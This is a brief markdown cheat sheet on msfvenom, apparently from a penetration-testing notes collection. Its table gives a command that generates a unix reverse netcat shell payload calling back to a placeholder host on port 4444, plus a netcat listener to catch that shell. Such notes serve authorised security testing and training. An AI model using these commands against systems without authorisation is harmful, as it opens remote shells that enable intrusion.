# msfvenom
[Readme](../../README.md)

- [msfvenom](#msfvenom)
  - [Commands](#commands)
    - [Examples](#examples)


## Commands
### Examples

| What                        | Command                                                         |
| :-------------------------- | :-------------------------------------------------------------- |
| Payload for reverse shell   | ```msfvenom -p cmd/unix/reverse_netcat lhost=ip lport=4444 R``` |
| Open port for reverse shell | ```nc -lvp 4444```                                              |

